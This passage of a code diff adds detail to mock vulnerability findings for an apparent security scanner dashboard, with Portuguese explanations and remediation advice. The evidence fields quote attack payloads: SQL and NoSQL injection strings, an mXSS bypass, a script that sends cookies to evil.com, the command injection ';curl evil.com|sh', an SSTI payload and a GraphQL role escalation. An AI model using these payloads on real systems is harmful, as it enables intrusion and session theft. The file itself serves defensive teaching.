@@ -64,34 +64,130 @@ const Store = {
   ],
 
   vulns: [
-    // SC-7f3a1b2c (loja-exemplo) - 41 vulns total, showing key ones
-    { id: 'V-001', title: 'SQL Injection via search parameter: /api/produtos?q=\' OR 1=1--', severity: 'critical', category: 'Injection', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/produtos?q=', evidence: 'Time-based blind SQLi confirmed, 5s delay on sleep(5)' },
-    { id: 'V-002', title: 'Stored XSS in product review field (bypasses DOMPurify via mXSS)', severity: 'critical', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'POST /api/reviews', evidence: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>' },
-    { id: 'V-003', title: 'JWT secret is "secret123" - brute-forced in <1 second', severity: 'critical', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: 'jwt-cracker found secret in 0.3s, forged admin token' },
-    { id: 'V-004', title: 'IDOR: /api/pedidos/:id returns any users order data', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/pedidos/1337', evidence: 'User A can access User B orders by incrementing ID' },
-    { id: 'V-005', title: 'SSRF via image URL in /api/produtos/import allows internal network scanning', severity: 'high', category: 'SSRF', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'ssrf-vuln', endpoint: 'POST /api/produtos/import', evidence: 'Successfully accessed http://169.254.169.254/latest/meta-data/' },
-    { id: 'V-006', title: 'Mass assignment: POST /api/users accepts role field, escalation to admin', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-exploit', endpoint: 'POST /api/users', evidence: '{"email":"test@x.com","role":"admin"} created admin account' },
-    { id: 'V-007', title: 'Reflected XSS in /busca?q= parameter (no output encoding)', severity: 'high', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'GET /busca?q=', evidence: '/busca?q=<script>fetch("https://evil.com/"+document.cookie)</script>' },
-    { id: 'V-008', title: 'Missing rate limit on /api/auth/login (brute force possible)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: '1000 requests in 10 seconds without blocking' },
-    { id: 'V-009', title: 'CORS allows any origin with credentials', severity: 'medium', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true' },
-    { id: 'V-010', title: 'Password reset token is sequential (guessable)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-exploit', endpoint: 'POST /api/auth/reset', evidence: 'Tokens are base64(user_id + timestamp), predictable' },
-    { id: 'V-011', title: 'Express stack traces exposed in production errors', severity: 'low', category: 'Information Disclosure', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: 'GET /api/undefined', evidence: 'Full stack trace with file paths and dependency versions' },
-    { id: 'V-012', title: 'Missing HSTS header on all responses', severity: 'low', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Strict-Transport-Security header not present' },
-    { id: 'V-013', title: 'Session cookies missing HttpOnly flag', severity: 'low', category: 'Session', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'fixed', agent: 'auth-vuln', endpoint: '*', evidence: 'Set-Cookie: session=... (no HttpOnly)' },
+    // SC-7f3a1b2c (loja-exemplo)
+    { id: 'V-001', title: 'SQL Injection via search parameter: /api/produtos?q=\' OR 1=1--', severity: 'critical', category: 'Injection', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/produtos?q=', evidence: 'Time-based blind SQLi confirmed, 5s delay on sleep(5)', cvss: 9.8, cwe: 'CWE-89',
+      explanation: 'SQL Injection ocorre quando dados do usuario sao inseridos diretamente em queries SQL sem sanitizacao. O atacante pode manipular a query para extrair, modificar ou deletar dados do banco. Neste caso, o parametro "q" da busca e concatenado diretamente na query SQL.',
+      impact: 'Acesso total ao banco de dados: leitura de senhas, dados de clientes, pedidos, cartoes. Possivel execucao de comandos no servidor via xp_cmdshell (SQL Server) ou LOAD_FILE (MySQL).',
+      remediation: 'Use prepared statements/parameterized queries. Exemplo: db.query("SELECT * FROM produtos WHERE nome LIKE ?", ["%"+q+"%"]). Nunca concatene input do usuario em SQL.',
+      references: ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'] },
+    { id: 'V-002', title: 'Stored XSS in product review field (bypasses DOMPurify via mXSS)', severity: 'critical', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'POST /api/reviews', evidence: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', cvss: 9.1, cwe: 'CWE-79',
+      explanation: 'Cross-Site Scripting (XSS) Stored acontece quando o servidor armazena codigo malicioso enviado pelo usuario e o exibe para outros usuarios. Neste caso, o campo de avaliacao de produto aceita HTML que, ao ser renderizado, executa JavaScript no navegador da vitima. O payload usa mXSS (mutation XSS) para burlar o DOMPurify.',
+      impact: 'Roubo de cookies de sessao, redirecionamento para phishing, keylogging, defacement da pagina, propagacao de worm (cada usuario que ve a review e infectado).',
+      remediation: 'Sanitize no backend com allowlist de tags HTML seguras. Encode output com htmlspecialchars(). Use Content-Security-Policy header. Atualize DOMPurify para versao mais recente que corrige mXSS.',
+      references: ['https://owasp.org/www-community/attacks/xss/', 'https://cure53.de/fp170.pdf'] },
+    { id: 'V-003', title: 'JWT secret is "secret123" - brute-forced in <1 second', severity: 'critical', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: 'jwt-cracker found secret in 0.3s, forged admin token', cvss: 9.8, cwe: 'CWE-347',
+      explanation: 'JSON Web Tokens (JWT) sao assinados com uma chave secreta. Se essa chave for fraca (como "secret123"), um atacante pode usar ferramentas como jwt-cracker para descobri-la por forca bruta em segundos. Com a chave, ele pode forjar tokens validos para qualquer usuario, incluindo admin.',
+      impact: 'Acesso total como qualquer usuario do sistema. O atacante pode criar tokens admin, acessar dados de todos os clientes, modificar pedidos e configuracoes.',
+      remediation: 'Use uma chave secreta com pelo menos 256 bits de entropia (ex: openssl rand -hex 32). Considere migrar para RS256 (chaves assimetricas). Implemente rotacao de chaves.',
+      references: ['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/', 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens'] },
+    { id: 'V-004', title: 'IDOR: /api/pedidos/:id returns any users order data', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/pedidos/1337', evidence: 'User A can access User B orders by incrementing ID', cvss: 7.5, cwe: 'CWE-639',
+      explanation: 'Insecure Direct Object Reference (IDOR) ocorre quando a aplicacao usa IDs sequenciais e nao verifica se o usuario autenticado tem permissao para acessar o recurso. Incrementando o ID na URL, qualquer usuario pode ver pedidos de outros clientes.',
+      impact: 'Exposicao de dados pessoais (nome, endereco, CPF) e historico de compras de todos os clientes. Viola LGPD e pode gerar multas de ate 2% do faturamento.',
+      remediation: 'Valide que o usuario autenticado e dono do recurso: if (pedido.userId !== req.user.id) return 403. Use UUIDs ao inves de IDs sequenciais. Implemente middleware de autorizacao.',
+      references: ['https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', 'https://portswigger.net/web-security/access-control/idor'] },
+    { id: 'V-005', title: 'SSRF via image URL in /api/produtos/import allows internal network scanning', severity: 'high', category: 'SSRF', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'ssrf-vuln', endpoint: 'POST /api/produtos/import', evidence: 'Successfully accessed http://169.254.169.254/latest/meta-data/', cvss: 8.6, cwe: 'CWE-918',
+      explanation: 'Server-Side Request Forgery (SSRF) ocorre quando o servidor faz requisicoes HTTP baseadas em URLs fornecidas pelo usuario sem validacao. O atacante pode acessar servicos internos (Redis, banco de dados, metadata de cloud) que nao estao expostos na internet.',
+      impact: 'Acesso a credenciais AWS/GCP via endpoint de metadata (169.254.169.254). Scan de rede interna. Acesso a servicos como Redis, Elasticsearch, bancos de dados internos. Possivel RCE via servicos internos.',
+      remediation: 'Implemente allowlist de dominios permitidos. Bloqueie ranges de IPs internos (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Use SSRF-safe HTTP client libraries.',
+      references: ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf'] },
+    { id: 'V-006', title: 'Mass assignment: POST /api/users accepts role field, escalation to admin', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-exploit', endpoint: 'POST /api/users', evidence: '{"email":"test@x.com","role":"admin"} created admin account', cvss: 8.1, cwe: 'CWE-915',
+      explanation: 'Mass Assignment ocorre quando a API aceita e processa campos que nao deveriam ser editaveis pelo usuario. Neste caso, o campo "role" e aceito no body do request de criacao de usuario, permitindo que qualquer pessoa se cadastre como admin.',
+      impact: 'Escalacao de privilegios: qualquer usuario pode se tornar administrador. Acesso total ao painel admin, dados de todos os usuarios, configuracoes do sistema.',
+      remediation: 'Use allowlist de campos permitidos: const { email, password, name } = req.body (ignorando role). Nunca use Object.assign(user, req.body) diretamente. Use DTOs para validar input.',
+      references: ['https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', 'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html'] },
+    { id: 'V-007', title: 'Reflected XSS in /busca?q= parameter (no output encoding)', severity: 'high', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'GET /busca?q=', evidence: '/busca?q=<script>fetch("https://evil.com/"+document.cookie)</script>', cvss: 6.1, cwe: 'CWE-79',
+      explanation: 'XSS Refletido ocorre quando o input do usuario e refletido diretamente na pagina sem encoding. Diferente do Stored, o payload nao e armazenado - ele vem na URL e e executado quando a vitima clica em um link malicioso enviado por phishing.',
+      impact: 'Roubo de sessao via cookie theft. O atacante envia link por email/WhatsApp, a vitima clica, e o JavaScript exfiltra o cookie de sessao para o servidor do atacante.',
+      remediation: 'Encode toda saida HTML: use textContent ao inves de innerHTML. No servidor, escape com htmlspecialchars(). Implemente CSP (Content-Security-Policy) header.',
+      references: ['https://owasp.org/www-community/attacks/xss/', 'https://portswigger.net/web-security/cross-site-scripting/reflected'] },
+    { id: 'V-008', title: 'Missing rate limit on /api/auth/login (brute force possible)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: '1000 requests in 10 seconds without blocking', cvss: 5.3, cwe: 'CWE-307',
+      explanation: 'Sem rate limiting, um atacante pode tentar milhares de combinacoes de senha por segundo ate encontrar a correta. Ferramentas como Hydra ou Burp Intruder automatizam esse processo.',
+      impact: 'Comprometimento de contas com senhas fracas. Dicionarios de senhas comuns (rockyou.txt) permitem quebrar senhas como "123456", "password" em segundos.',
+      remediation: 'Implemente rate limiting: maximo 5 tentativas por minuto por IP/usuario. Use express-rate-limit ou similar. Apos 5 falhas, exija CAPTCHA. Apos 20, bloqueie temporariamente.',
+      references: ['https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks', 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'] },
+    { id: 'V-009', title: 'CORS allows any origin with credentials', severity: 'medium', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true', cvss: 5.4, cwe: 'CWE-942',
+      explanation: 'CORS (Cross-Origin Resource Sharing) mal configurado permite que qualquer site faca requisicoes autenticadas para sua API. Com Allow-Origin: * e Allow-Credentials: true, um site malicioso pode fazer fetch() para sua API usando os cookies da vitima.',
+      impact: 'Um site malicioso pode ler dados privados do usuario (pedidos, perfil, dados de pagamento) sem que a vitima perceba, apenas visitando uma pagina controlada pelo atacante.',
+      remediation: 'Configure CORS com allowlist de origens especificas: cors({ origin: ["https://lojaexemplo.com.br"], credentials: true }). Nunca use wildcard (*) com credentials.',
+      references: ['https://portswigger.net/web-security/cors', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS'] },
+    { id: 'V-010', title: 'Password reset token is sequential (guessable)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-exploit', endpoint: 'POST /api/auth/reset', evidence: 'Tokens are base64(user_id + timestamp), predictable', cvss: 6.5, cwe: 'CWE-640',
+      explanation: 'Tokens de reset de senha devem ser aleatorios e imprevisives. Neste caso, o token e apenas base64(user_id + timestamp), que pode ser facilmente calculado pelo atacante sabendo o ID do usuario e o horario aproximado do pedido.',
+      impact: 'O atacante pode resetar a senha de qualquer usuario sem acesso ao email. Basta saber o user_id e fazer o request na mesma janela de tempo.',
+      remediation: 'Gere tokens com crypto.randomBytes(32).toString("hex"). Armazene hash do token no banco (nao o token em texto). Expire em 15 minutos. Use uma unica vez.',
+      references: ['https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html'] },
+    { id: 'V-011', title: 'Express stack traces exposed in production errors', severity: 'low', category: 'Information Disclosure', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: 'GET /api/undefined', evidence: 'Full stack trace with file paths and dependency versions', cvss: 3.7, cwe: 'CWE-209',
+      explanation: 'Em modo de desenvolvimento, Express exibe stack traces completos nos erros. Se isso esta ativo em producao, o atacante ve caminhos de arquivos no servidor, versoes de dependencias e detalhes internos que facilitam outros ataques.',
+      impact: 'Exposicao de informacoes internas: caminhos de arquivos (/home/deploy/app/), versoes de pacotes (express@4.18.2), estrutura do projeto. Facilita planejamento de ataques direcionados.',
+      remediation: 'Configure NODE_ENV=production. Use error handler customizado que retorna apenas mensagem generica: app.use((err, req, res, next) => res.status(500).json({ error: "Internal server error" })).',
+      references: ['https://expressjs.com/en/advanced/best-practice-security.html'] },
+    { id: 'V-012', title: 'Missing HSTS header on all responses', severity: 'low', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Strict-Transport-Security header not present', cvss: 3.1, cwe: 'CWE-319',
+      explanation: 'HSTS (HTTP Strict Transport Security) forca o navegador a sempre usar HTTPS. Sem ele, um atacante em uma rede WiFi publica pode interceptar a primeira requisicao HTTP (antes do redirect para HTTPS) e fazer um ataque man-in-the-middle.',
+      impact: 'Possibilidade de downgrade para HTTP em redes nao seguras. Interceptacao de credenciais e cookies na primeira requisicao.',
+      remediation: 'Adicione o header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. No Express: app.use(helmet.hsts({ maxAge: 31536000 })).',
+      references: ['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security'] },
+    { id: 'V-013', title: 'Session cookies missing HttpOnly flag', severity: 'low', category: 'Session', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'fixed', agent: 'auth-vuln', endpoint: '*', evidence: 'Set-Cookie: session=... (no HttpOnly)', cvss: 3.5, cwe: 'CWE-1004',
+      explanation: 'O flag HttpOnly impede que JavaScript acesse o cookie via document.cookie. Sem ele, um ataque XSS pode facilmente roubar o cookie de sessao e enviar para o servidor do atacante.',
+      impact: 'Se combinado com qualquer XSS, permite roubo completo da sessao do usuario. O atacante pode se passar pelo usuario sem saber a senha.',
+      remediation: 'Configure cookies com HttpOnly e Secure: res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "strict" }).',
+      references: ['https://owasp.org/www-community/HttpOnly'] },
     // SC-a92e4d1f (gestao-obras-api)
-    { id: 'V-014', title: 'NoSQL Injection in /api/obras?filter={$gt:""}', severity: 'critical', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/obras?filter=', evidence: 'MongoDB operator injection returns all documents' },
-    { id: 'V-015', title: 'API key transmitted in URL query parameter', severity: 'high', category: 'Authentication', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'auth-vuln', endpoint: 'GET /api/*?api_key=', evidence: 'API key visible in server access logs and browser history' },
-    { id: 'V-016', title: 'Broken function level authorization on /api/admin/* endpoints', severity: 'high', category: 'Authorization', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/admin/users', evidence: 'Regular user token accepted on admin endpoints' },
-    { id: 'V-017', title: 'Unrestricted file upload accepts .php files', severity: 'high', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/documentos/upload', evidence: 'Uploaded shell.php.jpg, accessible at /uploads/shell.php.jpg' },
+    { id: 'V-014', title: 'NoSQL Injection in /api/obras?filter={$gt:""}', severity: 'critical', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/obras?filter=', evidence: 'MongoDB operator injection returns all documents', cvss: 9.8, cwe: 'CWE-943',
+      explanation: 'NoSQL Injection e similar ao SQL Injection, mas em bancos NoSQL como MongoDB. Ao enviar operadores MongoDB como {$gt:""} no parametro filter, o atacante pode manipular a query para retornar todos os documentos da colecao, bypassing filtros de acesso.',
+      impact: 'Acesso a todos os dados de obras, orcamentos, contratos e informacoes confidenciais de clientes. Possivel exfiltracao massiva de dados.',
+      remediation: 'Valide e sanitize input: rejeite objetos que contenham chaves comecando com $. Use mongo-sanitize. Defina schema estrito com Mongoose validators.',
+      references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection'] },
+    { id: 'V-015', title: 'API key transmitted in URL query parameter', severity: 'high', category: 'Authentication', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'auth-vuln', endpoint: 'GET /api/*?api_key=', evidence: 'API key visible in server access logs and browser history', cvss: 7.4, cwe: 'CWE-598',
+      explanation: 'API keys na URL query string ficam visiveis em logs do servidor, historico do navegador, referer headers e proxies intermediarios. Qualquer pessoa com acesso a esses logs pode obter a chave.',
+      impact: 'Chave de API exposta em logs pode ser usada por terceiros para acessar a API com as permissoes do dono da chave, consumir cota e acessar dados privados.',
+      remediation: 'Transmita API keys no header Authorization: Authorization: Bearer <api_key>. Nunca na URL. Configure logs para nao registrar headers de autorizacao.',
+      references: ['https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/'] },
+    { id: 'V-016', title: 'Broken function level authorization on /api/admin/* endpoints', severity: 'high', category: 'Authorization', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/admin/users', evidence: 'Regular user token accepted on admin endpoints', cvss: 8.2, cwe: 'CWE-285',
+      explanation: 'Os endpoints administrativos (/api/admin/*) nao verificam se o usuario tem role de admin. Qualquer usuario autenticado pode acessar funcionalidades administrativas simplesmente chamando a URL.',
+      impact: 'Usuarios comuns podem gerenciar outros usuarios, ver dados sensives, alterar configuracoes do sistema, exportar relatorios confidenciais.',
+      remediation: 'Implemente middleware de autorizacao por role: function requireAdmin(req, res, next) { if (req.user.role !== "admin") return res.status(403).json({error: "Forbidden"}); next(); }',
+      references: ['https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/'] },
+    { id: 'V-017', title: 'Unrestricted file upload accepts .php files', severity: 'high', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/documentos/upload', evidence: 'Uploaded shell.php.jpg, accessible at /uploads/shell.php.jpg', cvss: 8.8, cwe: 'CWE-434',
+      explanation: 'O endpoint de upload nao valida corretamente o tipo de arquivo. Um atacante pode fazer upload de um arquivo PHP disfarado (shell.php.jpg) que, dependendo da configuracao do servidor, sera executado como PHP, dando ao atacante shell remoto no servidor.',
+      impact: 'Remote Code Execution (RCE): o atacante pode executar comandos no servidor, ler arquivos de configuracao com senhas, instalar backdoors, pivotar para a rede interna.',
+      remediation: 'Valide tipo de arquivo por magic bytes (nao pela extensao). Use allowlist de extensoes (.pdf, .doc, .jpg). Armazene uploads fora do webroot. Use nomes aleatorios. Sirva com Content-Disposition: attachment.',
+      references: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload', 'https://portswigger.net/web-security/file-upload'] },
     // SC-d1f7a6b4 (plataforma-seg)
-    { id: 'V-018', title: 'OAuth2 state parameter not validated (CSRF on login)', severity: 'critical', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /oauth/callback', evidence: 'Replayed callback URL without state param, session hijacked' },
-    { id: 'V-019', title: 'Refresh token never expires and can be reused after revocation', severity: 'high', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-exploit', endpoint: 'POST /oauth/token', evidence: 'Revoked refresh token still produces new access tokens' },
-    { id: 'V-020', title: 'Open redirect in /auth/callback?redirect_uri=', severity: 'medium', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /auth/callback', evidence: 'redirect_uri=https://evil.com accepted without validation' },
+    { id: 'V-018', title: 'OAuth2 state parameter not validated (CSRF on login)', severity: 'critical', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /oauth/callback', evidence: 'Replayed callback URL without state param, session hijacked', cvss: 9.3, cwe: 'CWE-352',
+      explanation: 'O parametro "state" no OAuth2 protege contra CSRF. Sem ele, um atacante pode forjar o callback URL e logar a vitima na conta do atacante (login CSRF) ou hijackar a sessao OAuth da vitima.',
+      impact: 'Hijack de sessao: o atacante intercepta o authorization code da vitima e o usa para autenticar como ela. Ou forca a vitima a logar na conta do atacante para capturar dados.',
+      remediation: 'Gere um state aleatorio antes de redirecionar para o provider OAuth: state = crypto.randomBytes(16).toString("hex"). Valide que o state retornado no callback corresponde ao armazenado na sessao.',
+      references: ['https://datatracker.ietf.org/doc/html/rfc6749#section-10.12', 'https://portswigger.net/web-security/oauth'] },
+    { id: 'V-019', title: 'Refresh token never expires and can be reused after revocation', severity: 'high', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-exploit', endpoint: 'POST /oauth/token', evidence: 'Revoked refresh token still produces new access tokens', cvss: 7.6, cwe: 'CWE-613',
+      explanation: 'Refresh tokens devem ter expiracao e serem invalidados apos revogacao. Neste caso, mesmo apos o usuario fazer logout (que deveria revogar o token), o token antigo ainda funciona para gerar novos access tokens.',
+      impact: 'Persistencia de acesso: mesmo apos trocar a senha ou revogar sessoes, o atacante com um refresh token roubado mantem acesso indefinido a conta.',
+      remediation: 'Armazene refresh tokens no banco com expiracao (ex: 30 dias). Ao revogar, delete do banco. Use refresh token rotation (cada uso gera um novo e invalida o anterior).',
+      references: ['https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/'] },
+    { id: 'V-020', title: 'Open redirect in /auth/callback?redirect_uri=', severity: 'medium', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /auth/callback', evidence: 'redirect_uri=https://evil.com accepted without validation', cvss: 4.7, cwe: 'CWE-601',
+      explanation: 'Open redirect permite que o atacante use seu dominio para redirecionar vitimas para sites maliciosos. Como a URL comeca no seu dominio (confiavel), a vitima nao desconfia. Muito usado em phishing e roubo de tokens OAuth.',
+      impact: 'Phishing convincente usando seu dominio como trampolim. Possivel roubo de authorization codes OAuth se combinado com manipulacao do redirect_uri.',
+      remediation: 'Valide redirect_uri contra allowlist de URLs permitidas. Rejeite URLs com dominio diferente. Use path-only redirects quando possivel.',
+      references: ['https://portswigger.net/kb/issues/00500100_open-redirection-reflected', 'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'] },
     // SC-f4a9d832 (imobtech-app)
-    { id: 'V-021', title: 'Command injection in PDF export via filename: ;curl evil.com|sh', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-exploit', endpoint: 'POST /api/relatorios/pdf', evidence: 'Filename passed unsanitized to wkhtmltopdf shell command' },
-    { id: 'V-022', title: 'SSTI in email template engine: {{constructor.constructor("return this")()}}', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/notificacoes/email', evidence: 'Nunjucks template injection confirmed, RCE achieved' },
-    { id: 'V-023', title: 'GraphQL introspection enabled, exposes entire schema', severity: 'medium', category: 'Information Disclosure', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'recon', endpoint: 'POST /graphql', evidence: '__schema { types { name fields { name } } } returns full schema' },
-    { id: 'V-024', title: 'Privilege escalation via GraphQL mutation: updateUser(role: ADMIN)', severity: 'high', category: 'Authorization', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'authz-exploit', endpoint: 'POST /graphql', evidence: 'mutation { updateUser(id: "me", role: ADMIN) { role } } succeeds' },
+    { id: 'V-021', title: 'Command injection in PDF export via filename: ;curl evil.com|sh', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-exploit', endpoint: 'POST /api/relatorios/pdf', evidence: 'Filename passed unsanitized to wkhtmltopdf shell command', cvss: 9.8, cwe: 'CWE-78',
+      explanation: 'Command Injection (ou OS Injection) ocorre quando input do usuario e passado diretamente para comandos do sistema operacional. Neste caso, o nome do arquivo PDF e inserido em um comando shell sem sanitizacao, permitindo executar comandos arbitrarios.',
+      impact: 'Remote Code Execution (RCE) completo no servidor. O atacante pode: ler /etc/passwd, instalar backdoors, roubar chaves SSH, pivotar para outros servidores na rede.',
+      remediation: 'Nunca passe input do usuario para shell commands. Use APIs nativas ao inves de child_process.exec(). Se necessario, use execFile() com array de argumentos (sem shell). Sanitize com allowlist de caracteres alfanumericos.',
+      references: ['https://owasp.org/www-community/attacks/Command_Injection', 'https://portswigger.net/web-security/os-command-injection'] },
+    { id: 'V-022', title: 'SSTI in email template engine: {{constructor.constructor("return this")()}}', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/notificacoes/email', evidence: 'Nunjucks template injection confirmed, RCE achieved', cvss: 9.8, cwe: 'CWE-1336',
+      explanation: 'Server-Side Template Injection (SSTI) ocorre quando input do usuario e processado por um template engine (Nunjucks, Jinja2, EJS). O atacante pode escapar do contexto do template e executar codigo no servidor. E uma das vulnerabilidades mais severas pois leva direto a RCE.',
+      impact: 'Remote Code Execution completo. O atacante acessa o runtime do Node.js, pode ler arquivos, executar comandos, acessar variaveis de ambiente (incluindo API keys e senhas de banco).',
+      remediation: 'Nunca insira input de usuario em templates server-side. Use templates pre-compilados com variaveis escapadas. Se necessario, use sandbox mode do template engine. Prefira template engines que nao permitem execucao de codigo (Mustache/Handlebars).',
+      references: ['https://portswigger.net/web-security/server-side-template-injection', 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection'] },
+    { id: 'V-023', title: 'GraphQL introspection enabled, exposes entire schema', severity: 'medium', category: 'Information Disclosure', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'recon', endpoint: 'POST /graphql', evidence: '__schema { types { name fields { name } } } returns full schema', cvss: 5.3, cwe: 'CWE-200',
+      explanation: 'GraphQL introspection e um recurso que permite consultar o schema completo da API (todos os types, queries, mutations e seus campos). Em producao, isso da ao atacante um mapa completo da API, facilitando a descoberta de endpoints sensiveis.',
+      impact: 'O atacante descobre todos os endpoints, campos sensiveis (isAdmin, passwordHash, internalNotes), mutations perigosas (deleteUser, updateRole) sem precisar adivinhar.',
